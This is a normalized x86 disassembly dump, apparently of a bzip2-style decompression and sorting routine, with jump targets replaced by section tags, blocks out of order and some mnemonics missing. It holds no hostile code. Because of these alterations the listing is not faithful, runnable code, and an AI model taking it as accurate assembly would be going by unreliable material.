movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
and [ ebx + 0xc5c ] 0x0
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_100242d7
leave
retn
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
add eax 0xffffffd0
cmp [ ebx + 0x28 ] 0x0
mov [ ebx + 0x24 ] eax
push 0x1
je r-xdata
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
and [ ebx + 0xc58 ] 0x0
push eax
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0xc
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
and [ ebp - 0x10 ] 0x0
jmp r-xdata
inc [ eax + 0xc ]
mov eax [ ebp - 0x10 ]
cmp eax 0x10
jge r-xdata
inc [ eax + 0xc ]
inc [ ebp - 0x10 ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
mov edx [ ebp - 0x50 ]
cmp [ ebp - 0x10 ] edx
jge r-xdata
inc [ eax + 0xc ]
jmp r-xdata
xor edi edi
xor cl cl
cmp [ ebp - 0x44 ] edi
jle r-xdata
and [ ebp - 0x1c ] 0x0
inc [ eax + 0xc ]
cmp [ ebp - 0x34 ] 0x14
jg r-xdata
cmp [ ebp - 0x34 ] 0x1
jl r-xdata
inc [ eax + 0xc ]
inc [ ebp - 0x3c ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
mov ecx [ ebp - 0x40 ]
sub eax [ ecx + esi * 4 ]
inc esi
mov [ ebp - 0x14 ] esi
inc [ eax + 0xc ]
mov ecx [ ebp - 0x40 ]
sub eax [ ecx + esi * 4 ]
js r-xdata
inc esi
mov [ ebp - 0x14 ] esi
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ ebp - 0x14 ]
mov edx [ ebp - 0x40 ]
sub eax [ ecx + edx ]
jmp r-xdata
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
mov ecx [ ebp - 0x10 ]
mov [ ebx + 0xfa14 ] ecx
mov ecx [ ebp - 0x1c ]
mov [ ebx + 0xfa18 ] ecx
mov ecx [ ebp - 0x3c ]
mov [ ebx + 0xfa1c ] ecx
mov ecx [ ebp - 0x60 ]
mov [ ebx + 0xfa20 ] ecx
mov ecx [ ebp - 0x44 ]
mov [ ebx + 0xfa24 ] ecx
mov ecx [ ebp - 0x50 ]
mov [ ebx + 0xfa28 ] ecx
mov ecx [ ebp - 0x64 ]
mov [ ebx + 0xfa2c ] ecx
mov ecx [ ebp - 0x24 ]
mov [ ebx + 0xfa30 ] ecx
mov ecx [ ebp - 0x28 ]
mov [ ebx + 0xfa34 ] ecx
mov ecx [ ebp - 0x54 ]
mov [ ebx + 0xfa38 ] ecx
mov ecx [ ebp - 0x30 ]
mov [ ebx + 0xfa3c ] ecx
mov ecx [ ebp - 0x18 ]
mov [ ebx + 0xfa40 ] ecx
mov ecx [ ebp - 0x20 ]
mov [ ebx + 0xfa44 ] ecx
mov ecx [ ebp - 0x74 ]
mov [ ebx + 0xfa48 ] ecx
mov ecx [ ebp - 0x34 ]
mov [ ebx + 0xfa4c ] ecx
mov ecx [ ebp - 0x80 ]
mov [ ebx + 0xfa50 ] ecx
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0xfa54 ] ecx
mov ecx [ ebp - 0x2c ]
mov [ ebx + 0xfa58 ] ecx
mov ecx [ ebp - 0x6c ]
mov [ ebx + 0xfa5c ] ecx
mov ecx [ ebp - 0x70 ]
mov [ ebx + 0xfa60 ] ecx
mov ecx [ ebp - 0x5c ]
mov [ ebx + 0xfa64 ] ecx
mov ecx [ ebp - 0x48 ]
mov [ ebx + 0xfa68 ] ecx
mov ecx [ ebp - 0x40 ]
mov [ ebx + 0xfa6c ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0xfa70 ] ecx
jmp r-xdata
imul eax eax 0x61a80
push eax
push [ esi + 0x2c ]
call [ esi + 0x24 ]
add esp 0xc
mov [ ebx + 0xc4c ] eax
jmp r-xdata
imul eax eax 0x30d40
push eax
push [ esi + 0x2c ]
call [ esi + 0x24 ]
mov [ ebx + 0xc50 ] eax
mov eax [ ebx + 0x24 ]
imul eax eax 0x186a0
inc eax
push 0x1
sar eax 0x1
push eax
push [ esi + 0x2c ]
call [ esi + 0x24 ]
add esp 0x18
cmp [ ebx + 0xc50 ] 0x0
mov [ ebx + 0xc54 ] eax
je r-xdata
cmp [ ebp - 0x10 ] 0x10
jl r-xdata
and [ ebx + 0xc68 ] 0x0
xor eax eax
cmp [ ebx + eax + 0xd6c ] 0x0
je r-xdata
cmp edx edi
mov [ ebp - 0x10 ] edi
jle r-xdata
xor eax eax
mov eax [ ebp - 0x44 ]
and [ ebp - 0x3c ] 0x0
test eax eax
jle r-xdata
cmp eax 0x102
jge r-xdata
cmp eax 0x102
jge r-xdata
js r-xdata
test eax eax
jne r-xdata
push 0xfffffffd
inc eax
cmp eax 0x100
jl r-xdata
mov ecx [ ebx + 0xc68 ]
mov [ ebx + ecx + 0xd7c ] al
inc [ ebx + 0xc68 ]
and [ ebp - 0x1c ] 0x0
jmp r-xdata
and [ ebp - 0x3c ] 0x0
jmp r-xdata
mov dl [ ebx + edi + 0x650e ]
movzx eax dl
lea eax [ ebp + eax - 0xc ]
mov cl [ eax ]
test dl dl
jbe r-xdata
mov [ ebp + eax - 0xc ] cl
inc cl
movzx eax cl
cmp eax [ ebp - 0x44 ]
jl r-xdata
mov eax [ ebx + 0xc68 ]
and [ ebp - 0x28 ] 0x0
inc eax
mov [ ebp - 0x64 ] eax
mov eax [ ebx + 0x24 ]
imul eax eax 0x186a0
mov edx 0x100
mov [ ebp - 0x30 ] eax
xor eax eax
lea edi [ ebx + 0x40 ]
mov ecx edx
[ edi ]
push 0xf
mov [ ebp - 0x10 ] edx
mov esi 0xfff
pop eax
lea edi [ ebx + 0x1eb8 ]
lea ecx [ ebx + 0xab60 ]
lea edi [ ebx + 0xf9fc ]
lea edx [ ebx + 0xc99c ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x4c ]
mov eax [ ecx + eax * 4 ]
mov [ ebp - 0x54 ] eax
mov ecx [ ebp - 0x4c ]
mov eax [ ecx + eax * 4 ]
xor edx edx
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
cmp [ eax + ebx + 0xc6c ] 0x0
je r-xdata
mov eax [ ebx + 0xc68 ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x10
jl r-xdata
mov eax [ ebp - 0x3c ]
cmp eax [ ebp - 0x44 ]
jge r-xdata
mov [ ebx + edi + 0x1ebc ] cl
inc edi
cmp edi [ ebp - 0x50 ]
mov [ ebp - 0xc ] cl
jl r-xdata
mov esi eax
mov dl [ ebp - 0x24 ]
add dl cl
mov [ ebx + esi + 0xe7c ] dl
dec esi
dec [ ebp - 0x24 ]
jns r-xdata
lea ecx [ esi + 0x1 ]
mov [ edi ] ecx
dec eax
sub edi 0x4
test eax eax
jge r-xdata
push [ ebp - 0x60 ]
lea eax [ edx + 0x1830 ]
push [ ebp - 0x24 ]
push esi
push eax
lea eax [ edx - 0x1830 ]
push eax
mov eax [ ebp - 0x30 ]
call sub_100227f7
add [ ebp - 0x30 ] 0x102
mov [ edi ] esi
add esp 0x14
add edi 0x4
add edx 0x408
dec [ ebp - 0x64 ]
jne r-xdata
mov ecx [ ebp - 0x30 ]
movzx eax [ ecx + eax ]
cmp eax [ ebp - 0x24 ]
jle r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
jl r-xdata
test edi edi
je r-xdata
mov eax [ ebp - 0x74 ]
cmp eax 0x200000
jge r-xdata
cmp eax 0x1
je r-xdata
add eax 0x2
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x10 ] edi
mov al [ esi - 0x1 ]
dec dl
mov [ esi ] al
dec esi
test dl dl
ja r-xdata
mov cl al
mov [ ebp - 0x24 ] 0xf
shl cl 0x4
xor eax eax
cmp [ ebp - 0x50 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x24 ] eax
jle r-xdata
xor eax eax
cmp [ ebp - 0x60 ] eax
push 0x20
pop esi
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] eax
jle r-xdata
cmp eax esi
jge r-xdata
mov [ ebp - 0x24 ] eax
cmp eax [ ebp - 0x18 ]
jge r-xdata
or [ ebp - 0x20 ] 0xffffffff
mov [ ebp - 0x74 ] 0x1
cmp edi 0x1
jne r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
mov eax [ ebx + 0x1e7c ]
movzx eax [ eax + ebx + 0xe7c ]
mov cl [ eax + ebx + 0xd7c ]
inc [ ebp - 0x20 ]
mov esi [ ebp - 0x20 ]
movzx eax cl
add [ ebx + eax * 4 + 0x40 ] esi
cmp [ ebx + 0x28 ] dl
je r-xdata
movzx eax [ ebx + 0x1ebc ]
mov ecx [ ebx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x70 ] eax
imul eax eax 0x408
add eax ebx
lea edx [ eax + 0xb16c ]
mov [ ebp - 0x48 ] edx
lea edx [ eax + 0xe1cc ]
add eax 0xc99c
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x28 ] 0x31
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x10 ]
inc eax
cmp eax [ ebp - 0x60 ]
mov [ ebp - 0x10 ] eax
jl r-xdata
mov esi eax
and [ ebp - 0x10 ] 0x0
lea esi [ ebx + 0x40 ]
mov eax esi
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x30 ]
jge r-xdata
cmp [ ebp - 0x54 ] 0x1
jne r-xdata
add [ ebp - 0x20 ] eax
jmp r-xdata
cmp [ ebp - 0x20 ] edx
jle r-xdata
cmp esi edx
jle r-xdata
cmp ecx [ ebp - 0x18 ]
jg r-xdata
dec edi
cmp edi 0x10
jae r-xdata
add eax eax
cmp [ ebp - 0x28 ] 0x0
mov [ ebp - 0x74 ] eax
jne r-xdata
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx + eax * 2 ]
mov [ ebp - 0x20 ] ecx
mov edi [ ebp - 0x54 ]
cmp edi [ ebp - 0x64 ]
je r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
inc [ ebp - 0x10 ]
add eax 0x4
cmp [ ebp - 0x10 ] 0xff
jle r-xdata
mov esi edi
shr esi 0x4
lea eax [ ebx + esi * 4 + 0x1e7c ]
mov edx [ eax ]
and edi 0xf
add edi edx
cmp edi edx
mov cl [ ebx + edi + 0xe7c ]
jle r-xdata
mov edx [ ebx + 0x1e7c ]
lea eax [ ebx + edx ]
mov cl [ eax + edi + 0xe7c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x55 ] cl
cmp edi 0x3
jbe r-xdata
mov eax [ ebp - 0x5c ]
dec [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x24 ]
inc eax
cmp eax [ ebp - 0x50 ]
mov [ ebp - 0x24 ] eax
jge r-xdata
mov esi [ ebx + 0xc4c ]
mov [ esi + ecx * 4 ] eax
inc ecx
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] edx
mov [ ebp - 0x18 ] ecx
jg r-xdata
mov edi [ ebx + 0xc50 ]
movzx si cl
mov [ edi + eax * 2 ] si
inc eax
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] edx
mov [ ebp - 0x18 ] eax
jg r-xdata
mov ecx [ eax ]
test ecx ecx
jl r-xdata
and [ ebx + 0x444 ] 0x0
mov edx 0x100
lea eax [ ebx + 0x448 ]
mov ecx edx
mov edi eax
[ edi ] [ esi ]
mov ecx edx
inc [ eax ]
test esi esi
jle r-xdata
lea edx [ ebx + 0xe7c ]
test edi edi
jbe r-xdata
lea ecx [ ebx + 0xe7b ]
lea eax [ ecx + edx ]
mov edx ebx
sub edx ecx
add edx 0xe7c
mov [ ebp - 0x68 ] edx
mov edx ebx
sub edx ecx
add edx 0xe7a
mov [ ebp - 0x7c ] edx
mov edx ebx
sub edx ecx
add edx 0xe78
mov [ ebp - 0x78 ] edx
mov edx ebx
sub edx ecx
lea esi [ edi - 0x4 ]
add edx 0xe79
shr esi 0x2
add eax edi
mov [ ebp - 0x38 ] edx
inc esi
movzx eax [ ebx + eax + 0x1ebc ]
mov ecx [ ebx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x70 ] eax
imul eax eax 0x408
add eax ebx
mov [ ebp - 0x5c ] ecx
lea ecx [ eax + 0xb16c ]
mov [ ebp - 0x48 ] ecx
lea ecx [ eax + 0xe1cc ]
add eax 0xc99c
mov [ ebp - 0x28 ] 0x32
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x40 ] eax
cmp ecx [ ebp - 0x30 ]
jge r-xdata
jmp r-xdata
cmp eax [ ebp - 0x30 ]
jge r-xdata
jmp r-xdata
mov esi [ eax - 0x4 ]
add [ eax ] esi
add eax 0x4
dec ecx
jne r-xdata
and [ ebp - 0x10 ] ecx
lea eax [ ebx + 0x444 ]
lea eax [ ebx + 0x1e7c ]
dec [ eax ]
mov edx [ eax ]
mov [ ebx + edx + 0xe7c ] cl
cmp [ eax ] 0x0
jne r-xdata
mov edi eax
mov al [ edx + edi - 0x1 ]
mov [ edx + edi ] al
dec edi
lea eax [ ebx + esi * 4 + 0x1e7c ]
cmp edi [ eax ]
jg r-xdata
mov [ eax + 0xe7c ] cl
jmp r-xdata
lea esi [ eax + 0xe7c ]
mov cl [ eax ]
mov edx [ ebp - 0x68 ]
mov [ edx + eax ] cl
mov ecx [ ebp - 0x7c ]
add ecx eax
mov dl [ ecx ]
mov [ eax ] dl
mov edx [ ebp - 0x38 ]
mov dl [ edx + eax ]
mov [ ecx ] dl
mov ecx [ ebp - 0x78 ]
mov cl [ ecx + eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + eax ] cl
sub edi 0x4
sub eax 0x4
dec esi
jne r-xdata
mov eax [ ebp - 0xc ]
mov cl [ ebp - 0x55 ]
cmp ecx [ ebp - 0x18 ]
jg r-xdata
mov edx [ ebp - 0x18 ]
movzx eax cl
lea eax [ eax + ebx + 0xd7c ]
movzx ecx [ eax ]
lea ecx [ ebx + ecx * 4 + 0x40 ]
inc [ ecx ]
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov edi 0xfff
mov [ ebp - 0x38 ] 0xf
lea esi [ ebx + 0x1eb8 ]
dec [ edi ]
mov edx [ edi - 0x4 ]
mov eax [ edi ]
mov dl [ edx + ebx + 0xe8b ]
dec esi
sub edi 0x4
mov [ ebx + eax + 0xe7c ] dl
test esi esi
jg r-xdata
mov dl [ esi + edi - 0x1 ]
mov [ esi + edi ] dl
dec edi
jne r-xdata
inc [ ebp - 0x10 ]
add eax 0x4
cmp [ ebp - 0x10 ] edx
jle r-xdata
movzx eax [ eax ]
mov ecx [ ebx + 0xc4c ]
mov [ ecx + edx * 4 ] eax
movzx ax [ eax ]
mov ecx [ ebx + 0xc50 ]
mov [ ecx + edx * 2 ] ax
jmp r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ esi ]
add eax ebx
mov al [ eax + edx + 0xe7c ]
mov [ edi + ebx + 0xe7c ] al
dec edi
dec [ ebp - 0x68 ]
jns r-xdata
dec [ ebp - 0x38 ]
lea eax [ edi + 0x1 ]
mov [ esi ] eax
sub esi 0x4
cmp [ ebp - 0x38 ] 0x0
jge r-xdata
mov ecx [ eax ]
test ecx ecx
jl r-xdata
xor eax eax
inc eax
mov [ ebp - 0x10 ] eax
lea ecx [ ebx + 0x444 ]
mov eax [ ebp - 0x5c ]
dec [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x24 ]
inc eax
cmp eax [ ebp - 0x50 ]
mov [ ebp - 0x24 ] eax
jge r-xdata
inc [ ebp - 0x18 ]
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov [ ebp - 0x68 ] 0xf
inc [ ebp - 0x10 ]
add ecx 0x4
cmp [ ebp - 0x10 ] edx
jle r-xdata
movzx eax [ ebx + eax + 0x1ebc ]
mov ecx [ ebx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x70 ] eax
imul eax eax 0x408
add eax ebx
mov [ ebp - 0x5c ] ecx
lea ecx [ eax + 0xb16c ]
mov [ ebp - 0x48 ] ecx
lea ecx [ eax + 0xe1cc ]
add eax 0xc99c
mov [ ebp - 0x28 ] 0x32
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x40 ] eax
mov esi [ ecx ]
cmp esi [ ecx + 0x4 ]
jg r-xdata
and [ ebx + 0xc ] 0x0
or [ ebx + 0xc60 ] 0xffffffff
push 0x2
pop ecx
cmp [ ebx + 0x30 ] ecx
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x4 ] ecx
jl r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
pop ecx
xor eax eax
pop ecx
inc eax
xor esi esi
cmp [ ebp - 0x18 ] esi
mov [ ebp - 0x10 ] esi
jle r-xdata
xor edx edx
cmp [ ebp - 0x18 ] edx
lea edi [ ebx + 0x848 ]
mov ecx 0x101
lea esi [ ebx + 0x444 ]
[ edi ] [ esi ]
jle r-xdata
mov ecx [ ebx + 0xc4c ]
mov edx [ ebx + 0x34 ]
mov edx [ ecx + edx * 4 ]
mov esi [ ebx + 0x24 ]
shr edx 0x8
imul esi esi 0x186a0
mov [ ebx + 0x38 ] edx
xor edx edx
mov [ ebx + 0x440 ] edx
cmp [ ebx + 0x10 ] dl
je r-xdata
mov edx [ ebx + 0xc4c ]
movzx ecx [ edx + esi * 4 ]
lea ecx [ ebx + ecx * 4 + 0x444 ]
mov edi [ ecx ]
lea edx [ edx + edi * 4 ]
mov edi esi
shl edi 0x8
or [ edx ] edi
inc [ ecx ]
inc esi
cmp esi [ ebp - 0x18 ]
jl r-xdata
mov edx [ ebx + 0x34 ]
mov esi [ ebx + 0xc54 ]
mov ecx edx
sar ecx 0x1
movzx edi [ ecx + esi ]
movzx ecx dl
and cl 0x1
shl cl 0x2
shr edi cl
mov ecx [ ebx + 0xc50 ]
movzx ecx [ ecx + edx * 2 ]
and edi 0xf
shl edi 0x10
or edi ecx
jmp r-xdata
mov ecx [ ebx + 0xc50 ]
lea ecx [ ecx + edx * 2 ]
movzx esi [ ecx ]
lea esi [ ebx + esi * 4 + 0x848 ]
mov di [ esi ]
mov [ ecx ] di
test dl 0x1
jne r-xdata
mov edx [ ebx + 0x38 ]
cmp edx esi
jae r-xdata
mov [ ebx + 0x14 ] edx
mov [ ebx + 0x18 ] edx
mov edx [ ebx + 0x38 ]
cmp edx esi
jae r-xdata
mov [ ebp - 0x10 ] esi
mov esi [ ebx + 0xc54 ]
mov ecx edi
sar ecx 0x1
movzx esi [ esi + ecx ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x1c ] edi
and [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x1c ]
mov eax [ ebx + 0xc50 ]
shl cl 0x2
shr esi cl
lea eax [ eax + edi * 2 ]
movzx ecx [ eax ]
and esi 0xf
shl esi 0x10
or esi ecx
mov ecx [ ebp - 0x38 ]
mov [ eax ] dx
mov eax [ ebx + 0xc54 ]
add eax ecx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov ecx [ ebx + 0xc54 ]
mov eax edx
sar eax 0x1
lea edi [ eax + ecx ]
mov eax [ esi ]
mov ecx [ esi ]
sar eax 0xc
xor al [ edi ]
sar ecx 0xc
and al 0xf
xor al cl
mov [ edi ] al
xor eax eax
inc eax
mov edi [ ebx + 0xc54 ]
mov ecx edx
sar ecx 0x1
add edi ecx
mov cl [ edi ]
and cl 0xf0
or cl [ esi + 0x2 ]
mov [ edi ] cl
jmp r-xdata
mov ecx [ ecx + edx * 4 ]
mov [ ebx + 0x38 ] ecx
shr [ ebx + 0x38 ] 0x8
movzx ecx cl
mov [ ebx + 0x3c ] ecx
mov [ ebx + 0x440 ] eax
jmp r-xdata
mov ecx [ ecx + edx * 4 ]
mov [ ebx + 0x38 ] ecx
shr [ ebx + 0x38 ] 0x8
movzx ecx cl
mov [ ebx + 0x3c ] ecx
mov [ ebx + 0x440 ] eax
mov ecx [ rw-data ]
mov [ ebx + 0x14 ] ecx
dec [ ebx + 0x14 ]
mov ecx [ ebx + 0x14 ]
xor edx edx
cmp ecx eax
sete dl
mov [ ebx + 0x18 ] eax
xor [ ebx + 0x3c ] edx
jmp r-xdata
mov ecx edx
sar ecx 0xc
xor cl [ eax ]
sar edx 0xc
and cl 0xf
xor cl dl
mov [ eax ] cl
mov cl [ eax ]
sar edx 0x10
and cl 0xf0
or dl cl
mov [ eax ] dl
jmp r-xdata
inc [ esi ]
inc edx
cmp edx [ ebp - 0x18 ]
jl r-xdata
xor eax eax
inc eax
mov eax [ ebx + 0x34 ]
xor ecx ecx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x10 ] edx
mov [ ebx + 0x38 ] eax
mov [ ebx + 0x440 ] ecx
cmp [ ebx + 0x10 ] cl
je r-xdata
mov edx edi
mov edi esi
cmp edx [ ebx + 0x34 ]
jne r-xdata
mov ecx [ ebx + 0x24 ]
imul ecx ecx 0x186a0
cmp eax ecx
jae r-xdata
mov [ ebx + 0x14 ] ecx
mov [ ebx + 0x18 ] ecx
mov ecx [ ebx + 0x24 ]
imul ecx ecx 0x186a0
cmp eax ecx
jb r-xdata
xor eax eax
inc eax
lea eax [ ebx + 0x444 ]
push eax
push [ ebx + 0x34 ]
call sub_1001ca87
mov edx [ ebx + 0xc54 ]
mov [ ebx + 0x3c ] eax
mov eax [ ebx + 0x34 ]
pop ecx
pop ecx
mov ecx eax
shr ecx 0x1
movzx edx [ ecx + edx ]
movzx ecx al
and cl 0x1
shl cl 0x2
shr edx cl
mov ecx [ ebx + 0xc50 ]
movzx eax [ ecx + eax * 2 ]
and edx 0xf
shl edx 0x10
or edx eax
mov [ ebx + 0x38 ] edx
mov [ ebx + 0x440 ] 0x1
jmp r-xdata
lea eax [ ebx + 0x444 ]
push eax
push [ ebx + 0x34 ]
call sub_1001ca87
mov edx [ ebx + 0x34 ]
mov esi eax
pop ecx
mov [ ebx + 0x3c ] esi
mov eax edx
shr eax 0x1
pop ecx
mov ecx [ ebx + 0xc54 ]
movzx eax [ eax + ecx ]
movzx ecx dl
and cl 0x1
shl cl 0x2
shr eax cl
mov ecx [ ebx + 0xc50 ]
movzx ecx [ ecx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
xor ecx ecx
inc ecx
mov [ ebx + 0x38 ] eax
mov [ ebx + 0x440 ] ecx
mov eax [ rw-data ]
mov [ ebx + 0x14 ] eax
dec [ ebx + 0x14 ]
mov edi [ ebx + 0x14 ]
xor eax eax
cmp edi ecx
sete al
mov [ ebx + 0x18 ] ecx
xor eax esi
mov [ ebx + 0x3c ] eax
sub_10020f3b
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
cmp [ ebp + 0x8 ] edx
je r-xdata
leave
retn
mov ecx edx
sub ecx [ ebp + 0x8 ]
push ebx
cmp ecx 0x3
push esi
jle r-xdata
mov edx [ ebp + 0xc ]
jmp r-xdata
add edx 0xfffffffc
jmp r-xdata
dec edx
cmp edx [ ebp + 0x8 ]
jge r-xdata
cmp edx [ ebp + 0x8 ]
jge r-xdata
mov ecx [ eax + edx * 4 ]
mov ebx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ edx + 0x1 ]
jmp r-xdata
pop esi
pop ebx
mov ecx [ eax + edx * 4 ]
mov ebx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ edx + 0x4 ]
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jle r-xdata
cmp ecx [ ebp + 0xc ]
jle r-xdata
mov esi [ eax + ecx * 4 ]
cmp ebx [ edi + esi * 4 ]
jbe r-xdata
mov esi [ ebp - 0x4 ]
mov [ eax + ecx * 4 - 0x4 ] esi
mov esi [ eax + ecx * 4 ]
cmp ebx [ edi + esi * 4 ]
jbe r-xdata
mov esi [ ebp - 0x4 ]
mov [ eax + ecx * 4 - 0x10 ] esi
dec edx
mov [ eax + ecx * 4 - 0x4 ] esi
inc ecx
mov [ eax + ecx * 4 - 0x10 ] esi
add ecx 0x4
sub_10020fbd
push ebp
mov ebp esp
sub esp 0x344
and [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov [ ebp - 0x344 ] eax
mov [ ebp + 0xc ] 0x1
push edi
push 0x3ec
call sub_1001bf0e
dec [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
shl eax 0x2
lea ecx [ ebp + eax - 0x1b4 ]
lea eax [ ebp + eax - 0x344 ]
mov ebx [ eax ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] ecx
mov ecx [ ecx ]
mov eax ebx
sub eax ecx
cmp eax 0xa
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ebx
jge r-xdata
mov eax [ ebp - 0x18 ]
imul eax eax 0x1dc5
inc eax
and eax 0x7fff
push 0x3
xor edx edx
pop edi
mov [ ebp - 0x18 ] eax
div edi
test edx edx
jne r-xdata
mov edi [ ebp + 0x8 ]
push ebx
push ecx
mov eax esi
call sub_10020f3b
pop ecx
pop ecx
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov eax [ esi + ecx * 4 ]
